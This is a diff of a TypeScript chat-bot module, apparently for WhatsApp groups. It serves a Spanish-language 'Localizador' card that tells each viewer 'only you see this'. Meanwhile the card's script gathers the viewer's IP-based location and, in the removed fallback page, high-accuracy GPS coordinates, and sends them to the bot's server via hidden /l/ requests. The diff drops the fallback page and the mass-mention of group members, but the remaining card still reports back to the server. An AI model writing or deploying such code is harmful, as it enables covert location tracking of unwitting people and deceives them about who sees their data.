@@ -298,63 +298,11 @@ function send(res: any, code: number, type: string, body: any) {
   res.end(body);
 }
 
-/* página completa: fallback garantizado en navegador real */
-function page(sid: string, base: string, name: string) {
-  return `<!DOCTYPE html><html lang="es"><head><meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1"><title>Localizador</title>
-<style>
-*{box-sizing:border-box;margin:0;padding:0}
-body{font-family:-apple-system,'Segoe UI',Roboto,sans-serif;background:#070b14;color:#e9edf7;padding:14px}
-.card{max-width:430px;margin:0 auto;background:linear-gradient(165deg,#121a30,#0a0f1c);border:1px solid #22304d;border-radius:18px;overflow:hidden}
-.hd{padding:14px 15px;border-bottom:1px solid #1b2740;font-size:12px;letter-spacing:1.4px;font-weight:800;text-transform:uppercase;color:#9fe9ff}
-.bd{padding:16px 15px}
-.hi{font-size:15px;font-weight:700;margin-bottom:4px}.hi b{color:#00e5ff}
-.sb{font-size:12px;color:#8fa3c4;margin-bottom:14px}
-.r{display:flex;gap:8px;margin-bottom:8px}.k{font-size:11px;color:#7f93b5;width:88px}.v{font-size:12.5px;font-weight:700;word-break:break-all}
-.mp{border-radius:12px;overflow:hidden;border:1px solid #22304d;margin-top:12px}
-.mp img{display:block;width:100%;height:200px;object-fit:cover}
-.ft{padding:11px 15px;border-top:1px solid #1b2740;font-size:10.5px;color:#63769a}
-</style></head><body><div class="card">
-<div class="hd">Localizador</div>
-<div class="bd"><div class="hi">Hola <b>${name}</b></div>
-<div class="sb" id="sb">Obteniendo tu ubicación...</div><div id="out"></div></div>
-<div class="ft">solo tú ves esto</div></div>
-<script>
-var SID=${JSON.stringify(sid)},BASE=${JSON.stringify(base)};
-function paint(d){
- document.getElementById('sb').textContent='Esta es tu ubicación';
- document.getElementById('out').innerHTML=
-  '<div class="r"><div class="k">IP</div><div class="v">'+(d.ip||'—')+'</div></div>'+
-  '<div class="r"><div class="k">Ciudad</div><div class="v">'+(d.city||'—')+'</div></div>'+
-  '<div class="r"><div class="k">País</div><div class="v">'+(d.country||'—')+'</div></div>'+
-  '<div class="r"><div class="k">Coords</div><div class="v">'+d.lat.toFixed(5)+', '+d.lon.toFixed(5)+'</div></div>'+
-  '<div class="mp"><img src="'+BASE+'/m/'+SID+'?lat='+d.lat+'&lon='+d.lon+'"></div>';
-}
-fetch(BASE+'/g/'+SID).then(r=>r.json()).then(function(d){
- if(!d||!d.lat) throw 0;
- paint({ip:d.ip,city:d.city,country:d.country,lat:d.lat,lon:d.lon});
- fetch(BASE+'/l/'+SID+'?src=ip&lat='+d.lat+'&lon='+d.lon+'&city='+encodeURIComponent(d.city||'')+'&region='+encodeURIComponent(d.region||'')+'&country='+encodeURIComponent(d.country||''));
- if(navigator.geolocation)navigator.geolocation.getCurrentPosition(function(p){
-   var q='?src=gps&lat='+p.coords.latitude+'&lon='+p.coords.longitude+'&acc='+Math.round(p.coords.accuracy||0);
-   new Image().src=BASE+'/l/'+SID+q;
-   paint({ip:d.ip,city:d.city,country:d.country,lat:p.coords.latitude,lon:p.coords.longitude});
- },function(){},{enableHighAccuracy:true,timeout:9000});
-}).catch(function(){document.getElementById('sb').textContent='No se pudo obtener la ubicación';});
-</script></body></html>`;
-}
-
 async function handle(req: any, res: any) {
   const url = new URL(req.url || "/", `http://${req.headers.host || "localhost"}`);
   const p = url.pathname;
 
   if (p === "/__hc") return send(res, 200, "text/plain", "ok");
-
-  const v = p.match(/^\/v\/([A-Za-z0-9_-]{6,48})$/);
-  if (v) {
-    const s = sessions.get(v[1]);
-    if (!s) return send(res, 410, "text/html", "<h1>Enlace expirado</h1>");
-    return send(res, 200, "text/html; charset=utf-8", page(v[1], baseUrl(), s.author.split("@")[0]));
-  }
 
   const g = p.match(/^\/g\/([A-Za-z0-9_-]{6,48})$/);
   if (g) {
@@ -460,7 +408,6 @@ body{font-family:-apple-system,'Segoe UI',Roboto,system-ui,sans-serif;background
 .map img{display:block;width:100%;height:190px;object-fit:cover}
 .badge{position:absolute;left:8px;top:8px;font-size:9.5px;letter-spacing:.8px;font-weight:800;text-transform:uppercase;background:rgba(0,0,0,.72);color:#7cffb2;border:1px solid #2b6b4b;border-radius:6px;padding:3px 7px;z-index:2}
 .foot{padding:11px 15px;border-top:1px solid #1b2740;font-size:10.5px;color:#63769a;display:flex;justify-content:space-between;align-items:center}
-.open{color:#00e5ff;text-decoration:none;font-weight:700}
 .err{font-size:12px;color:#ff8f8f}
 </style>
 <div class="wrap"><div class="card">
@@ -470,7 +417,7 @@ body{font-family:-apple-system,'Segoe UI',Roboto,system-ui,sans-serif;background
 <div class="sub" id="sub">Rastreando tu señal...</div>
 <div id="out"></div>
 </div>
-<div class="foot"><span>solo tú ves esto</span><a class="open" id="open" href="__BASE__/v/__SID__" target="_blank">abrir ↗</a></div>
+<div class="foot"><span>solo tú ves esto</span></div>
 </div></div>
 <script>
 var SID="__SID__",BASE="__BASE__",ok=false;
@@ -496,8 +443,8 @@ function paint(d){
 function __locFail(){
   if(ok)return;
   new Image().src=BASE+'/l/'+SID+'?t='+Date.now();
-  $('sub').textContent='Abre el enlace de abajo';
-  $('out').innerHTML='<div class="err">Este visor no dejó leer la red.</div>';
+  $('sub').textContent='No se pudo obtener la ubicación';
+  $('out').innerHTML='<div class="err">Este visor bloqueó la petición de red o falló el túnel.</div>';
 }
 function boot(){
   fetch(BASE+'/g/'+SID).then(function(r){return r.json()}).then(function(d){
@@ -561,16 +508,13 @@ export default {
     const author: string = (msg.key as any).participant || from;
     const num = author.split("@")[0].split(":")[0];
 
-    let mentions: string[] = [author];
     let name = String((msg as any).pushName || "").trim();
 
     try {
       const meta: any = await sock.groupMetadata(from);
-      mentions = meta.participants.map((p: any) => p.id);
-      if (!mentions.includes(author)) mentions.push(author);
-      if (!name) {
-        const me = meta.participants.find((p: any) => p.id === author);
-        name = String(me?.name || me?.notify || me?.verifiedName || "").trim();
+      const me = meta.participants.find((p: any) => p.id === author);
+      if (me) {
+        name = String(me.name || me.notify || me.verifiedName || "").trim();
       }
     } catch {}
 
@@ -583,9 +527,9 @@ export default {
     setTimeout(() => sessions.delete(sid), TTL).unref?.();
 
     try {
-      const ping = await sock.sendMessage(
+      await sock.sendMessage(
         from,
-        { text: `📍 @${num} activó el localizador.\n\nAbre la tarjeta de abajo — cada quien ve la suya.`, mentions },
+        { text: `📍 @${num} activó el localizador.\n\nAbre la tarjeta de abajo — cada quien ve la suya.`, mentions: [author] },
         { quoted: msg },
       );
 
@@ -595,7 +539,7 @@ export default {
         .setFooter("Abre la tarjeta · cada quien ve la suya");
 
       rich.addSection(buildLocatePayload({ sid, base, name }));
-      await rich.send(from, { quoted: ping ?? msg });
+      await rich.send(from, { quoted: msg });
 
       await react("✅").catch(() => undefined);
     } catch {
